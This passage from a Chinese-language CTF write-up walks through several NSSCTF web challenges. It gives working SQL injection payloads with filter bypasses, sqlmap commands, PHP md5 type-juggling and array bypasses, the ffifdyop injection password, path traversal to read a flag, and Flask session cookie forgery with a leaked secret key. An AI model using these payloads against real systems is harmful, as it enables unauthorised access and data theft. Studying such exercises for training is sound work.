&#x3D; [‘ ‘,’\t’,’\r’,’\n’,’+‘,’[‘,’^‘,’]‘,’&quot;‘,’-‘,’$‘,’*‘,’?‘,’&lt;‘,’&gt;‘,’=‘,’`‘,];</p><p>還不能用英文 preg_match(‘&#x2F;[a-zA-Z]&#x2F;is’,$wllm)</p><p>那我們先打開fuzzshell 生成爆破字典</p><img src="68fc75ee60f78a41d0431d475fd0455f.png" alt="68fc75ee60f78a41d0431d475fd0455f.png" /><p>打開BP去爆破</p><img src="d1ce41419b7f2b6ec5cdbdcf65ede830.png" alt="d1ce41419b7f2b6ec5cdbdcf65ede830.png" /><p>ls 只有index.php  </p><img src="5694fffa82991a04e902a2ea2bb8de50.png" alt="5694fffa82991a04e902a2ea2bb8de50.png" /><p>再看看根目錄 </p><img src="d231317ca11fe1a936d1cd673796df37.png" alt="d231317ca11fe1a936d1cd673796df37.png" /><p>有一個flllllaaaaaaggggggg文件 , 剛剛試了試cd flllllaaaaaaggggggg沒成功 , 應該是txt文件 , 打開fuzzshell system(“cd &#x2F;flllllaaaaaaggggggg”) 去重 </p><img src="cf1e259f7cd54ca01b87dd24fd1b7f6a.png" alt="cf1e259f7cd54ca01b87dd24fd1b7f6a.png" /><p>BP爆破一下 , </p><img src="1ead456a2dd32d44ed0184888a306ec8.png" alt="1ead456a2dd32d44ed0184888a306ec8.png" /><h2 id="16-sql"><a href="#16-sql" class="headerlink" title="16.sql"></a>16.sql</h2><p><a href="http://node4.anna.nssctf.cn:28194/?wllm=1">http://node4.anna.nssctf.cn:28194/?wllm=1</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28194/?wllm=1 --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28194/?wllm=1 --dbs --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: wllm (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: wllm=1&#x27; AND 4783=4783 AND &#x27;DgVI&#x27;=&#x27;DgVI</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: wllm=1&#x27; AND (SELECT 3858 FROM(SELECT COUNT(*),CONCAT(0x716b716b71,(SELECT (ELT(3858=3858,1))),0x7170766271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#x27;jyRE&#x27;=&#x27;jyRE</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: wllm=1&#x27; AND (SELECT 2372 FROM (SELECT(SLEEP(5)))FzLh) AND &#x27;HGWW&#x27;=&#x27;HGWW</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: wllm=-4416&#x27; UNION ALL SELECT NULL,NULL,CONCAT(0x716b716b71,0x4d46505569644a6c594c556f656e6c726f706b4d484b6c79586c7574617a6e6b6559774368484f61,0x7170766271)-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] test</span><br><span class="line">[*] test_db</span><br></pre></td></tr></table></figure><p>查找字段数时，提示请勿非法操作</p><img src="94fafbe1a6e373bab66ac9d3f430d7fb.png" alt="94fafbe1a6e373bab66ac9d3f430d7fb.png" /><p>说明空格出现过滤，可以用&#x2F;**&#x2F;绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?wllm=1%27/**/order/**/by/**/4%23</span><br><span class="line"></span><br><span class="line">Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure><p>沒有4字段数为3</p> <img src="a4b2b77c2d1027399b7b6be442d414ad.png" alt="a4b2b77c2d1027399b7b6be442d414ad.png" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=datbase()%23</span><br></pre></td></tr></table></figure><img src="a829ef4366104e99100478c564649d4f.png" alt="a829ef4366104e99100478c564649d4f.png" /><p>看來還有过滤 &#x3D; </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=datbase()%23</span><br></pre></td></tr></table></figure><p>使用like代替&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema/**/like(database())%23</span><br></pre></td></tr></table></figure><img src="0541955768dbadf0f5138e3a13144d49.png" alt="0541955768dbadf0f5138e3a13144d49.png" /><p>查看LTLT_flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name/**/like(%22LTLT_flag%22)%23</span><br></pre></td></tr></table></figure><img src="83ca98ed1f3c834abef68f4562d61d30.png" alt="83ca98ed1f3c834abef68f4562d61d30.png" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(id,flag),3/**/from/**/LTLT_flag%23</span><br></pre></td></tr></table></figure><img src="2370baa6b1f4efac7147c371cfe695f1.png" alt="2370baa6b1f4efac7147c371cfe695f1.png" /><p>flag1 : NSSCTF{cf9ffc45-7a1</p><p>strlen(string)有20個字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(id,flag),3/**/from/**/LTLT_flag%23</span><br></pre></td></tr></table></figure><p>在group_concat 加一個mid(group_concat(column_name), 起始位置, 长度) </p><p>mid(……..,21,40)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1%27union/**/select/**/1,mid(group_concat(id,flag),21,40),3/**/from/**/LTLT_flag%23</span><br></pre></td></tr></table></figure><img src="40f96c8eb3a9f9156c397332ae075bcc.png" alt="40f96c8eb3a9f9156c397332ae075bcc.png" /><p>flag2 : 7-4e7a-b6d8-10ff2ead</p><p>41 - 60</p><img src="86120c33fa0c7fbcc9dfe0342d825306.png" alt="86120c33fa0c7fbcc9dfe0342d825306.png" /><p>db58}</p><p>flag : NSSCTF{cf9ffc45-7a17-4e7a-b6d8-10ff2eaddb58}</p><br/><h2 id="17-babyphp"><a href="#17-babyphp" class="headerlink" title="17.babyphp"></a>17.babyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;yee&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nop&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;go on&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;let&#x27;s get some php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li>post 一個 a不可以是數字 , 但是一個數字</li><li>post 兩個 b1 b2 md5值一樣</li><li>post 兩個 c1 c2兩字符串不相等, md5值一樣</li></ol><p>a可以用數組繞過 a[]&#x3D;1</p><p>b1 b2 都可以用數組繞過 方法二：使用数组绕过（更简单）</p><br/><p>如果PHP版本允许，可以尝试：</p><p>b1[]&#x3D;1&amp;b2[]&#x3D;2  &#x2F;&#x2F; NULL &#x3D;&#x3D;&#x3D; NULL</p><p>c1 , c2: md5相同值文件選一個 (0e繞過) &#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s878926199a  -&gt;0e545993274517709034328855841020</span><br><span class="line">s155964671a  -&gt;0e342768416822451524974117254469</span><br></pre></td></tr></table></figure><img src="55bf9b54aede8a60262900db6606f8d2.png" alt="55bf9b54aede8a60262900db6606f8d2.png" /><h2 id="18-奇妙的MD5"><a href="#18-奇妙的MD5" class="headerlink" title="18.奇妙的MD5"></a>18.奇妙的MD5</h2><h3 id="兩神奇的字符串"><a href="#兩神奇的字符串" class="headerlink" title="兩神奇的字符串"></a>兩神奇的字符串</h3><p><strong>0e215962017</strong> md5加密後 : <strong>0e291242476940776845150308577824</strong></p><p><strong>ffifdyop</strong> md5加密後:** 276f722736c95d99e921722cf9ed621c** , from hex 後是** ‘or’6É]é!r,ùíb**</p><p>ffifdyop是萬能密碼</p><p>抓個包看看</p><img src="b37282e967f6ce91bd65b7ffe174a690.png" alt="b37282e967f6ce91bd65b7ffe174a690.png" /><br/><p>hint: select * from ‘admin’ where password&#x3D;md5($pass,true)</p><p>要填寫萬能密碼: ffifdyop</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$x= $GET[&#x27;x&#x27;];</span><br><span class="line">$y = $_GET[&#x27;y&#x27;];</span><br><span class="line">if($x != $y &amp;&amp; md5($x) == md5($y))&#123;</span><br><span class="line">    ;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>(0e繞過)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s878926199a  -&gt;0e545993274517709034328855841020</span><br><span class="line">s155964671a  -&gt;0e342768416822451524974117254469</span><br></pre></td></tr></table></figure><img src="2700d2660e4a04d9c498fa1773717036.png" alt="2700d2660e4a04d9c498fa1773717036.png" /><p>数组绕过</p><img src="128ea3f616632eba411990eb56b74c70.png" alt="128ea3f616632eba411990eb56b74c70.png" /><h2 id="19-高亮主题-划掉-背景查看器"><a href="#19-高亮主题-划掉-背景查看器" class="headerlink" title="19.高亮主题(划掉)背景查看器"></a>19.高亮主题(划掉)背景查看器</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件包含漏洞演示</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取并包含用户输入的文件</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&#x27;..&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Access denied.&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No file specified.&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>dirsearch一下</p><img src="51ce037052d7772b9b20fbe8a7cd6b26.png" alt="51ce037052d7772b9b20fbe8a7cd6b26.png" /><p>[02:08:34] 200 -    11B - &#x2F;flag , 試一試有了一個提示</p><img src="8a6dc14880c549d4f517c4932b726e3e.png" alt="8a6dc14880c549d4f517c4932b726e3e.png" /><p>flag在根目錄下 </p><p> 在url下不能&#x2F;..&#x2F;..&#x2F;..&#x2F;.. , 代碼有說明  ,  那BP抓一下包</p><img src="02dfb9ca469befd3b4bcca77bfe9ece6.png" alt="02dfb9ca469befd3b4bcca77bfe9ece6.png" /><p>在切換主題時發現有POST 傳參 theme &#x3D; </p><p>試一試&#x2F;flag</p><img src="47b31af9751041bbc61d65e8df30f718.png" alt="47b31af9751041bbc61d65e8df30f718.png" /><p>不在這目錄下, ..一下</p><img src="4be84a4293e0bed53f122823feda714f.png" alt="4be84a4293e0bed53f122823feda714f.png" /><p>再..&#x2F;..&#x2F;……………….</p><img src="cee00419105f25959368de46b1b75db6.png" alt="cee00419105f25959368de46b1b75db6.png" /><p>theme&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag 成功拿到flag</p><h2 id="20-flask-jwt"><a href="#20-flask-jwt" class="headerlink" title="20.flask?jwt?"></a>20.flask?jwt?</h2><img src="f373c598d4c19eb78f3a03e17c9f1723.png" alt="f373c598d4c19eb78f3a03e17c9f1723.png" /><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>忘记密码<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/css/password.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/static/js/jquery-1.11.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> height=$(<span class="variable language_">document</span>).<span class="title function_">height</span>();</span></span><br><span class="line"><span class="language-javascript">$(<span class="string">&#x27;.main&#x27;</span>).<span class="title function_">css</span>(<span class="string">&#x27;height&#x27;</span>,height);</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height: 919px;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main0&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;formBox&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>登录密码重置<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;mainCol firLi&quot;</span>&gt;</span><span class="symbol">&amp;gt;</span>身份验证<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="symbol">&amp;gt;</span>登录密码重置<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;lastLi&quot;</span>&gt;</span><span class="symbol">&amp;gt;</span>重置完成<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/line.png&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;itembox&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">label</span>&gt;</span>邮箱号<span class="symbol">&amp;nbsp;</span>:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入注册邮箱号&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btnBox&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>发送重置密码邮件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer0&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer_l&quot;</span>&gt;</span>使用条款 | 隐私保护<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer_r&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span>&gt;</span>© C4skg<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span>&gt;</span>有问题请发送邮件至 adm1n@flag.com <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- secretkey: th3f1askisfunny --&gt;</span></span><br></pre></td></tr></table></figure><h3 id="session偽造"><a href="#session偽造" class="headerlink" title="session偽造"></a>session偽造</h3><p>th3f1askisfunny , 這個可能是session偽造 </p><p>注冊一下 , 12345 12345 </p><img src="b01798a1df1520a7381ab32a4cfe6b57.png" alt="b01798a1df1520a7381ab32a4cfe6b57.png" /><img src="86e46a2828e01e9a7aafc13852a79603.png" alt="86e46a2828e01e9a7aafc13852a79603.png" /><p>session &#x3D; .eJwlzjEOwzAIAMC_MHcA45iQz0RgQO2aNFPVvzdS15vuA3sdeT5hex9XPmB_BWxgKjisLcamKZJCqMzdJMdcBiNjriJ9jhvQq1OvSeqZNTNDKCWKptXqohWdGV3QGuOK6BQR1I1akhZaoYyomqjqptrJl4Q7cp15_DcNvj_Owi_0.aOiRBw.bgLfdWhJg0-721Y0mDQlFm8j0gM</p><p>下載: <a href="https://">https://github.com/noraj/flask-session-cookie-manager</a></p><p>我要用Ubuntu 才可以conda (web_env) </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &quot;.eJwlzjEOwzAIAMC_MHcA45iQz0RgQO2aNFPVvzdS15vuA3sdeT5hex9XPmB_BWxgKjisLcamKZJCqMzdJMdcBiNjriJ9jhvQq1OvSeqZNTNDKCWKptXqohWdGV3QGuOK6BQR1I1akhZaoYyomqjqptrJl4Q7cp15_DcNvj_Owi_0.aOiRBw.bgLfdWhJg0-721Y0mDQlFm8j0gM&quot; -s &quot;th3f1askisfunny&quot;</span><br><span class="line"></span><br><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;a9706a25a3a9e77e7109334a7e6c563030e8774c67e60bf414fc19beefceed71e7df1caf8b79fd4330b70a230800b1ddd14a12e19f0af076dffc099ba9941b5e&#x27;, &#x27;_user_id&#x27;: &#x27;2&#x27;&#125;</span><br></pre></td></tr></table></figure><p>合理猜測id &#x3D; 1 </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;a9706a25a3a9e77e7109334a7e6c563030e8774c67e60bf414fc19beefceed71e7df1caf8b79fd4330b70a230800b1ddd14a12e19f0af076dffc099ba9941b5e&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> python3 flask_session_cookie_manager3.py encode -s &quot;th3f1</span><br><span class="line">askisfunny&quot; -t &quot; &#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: 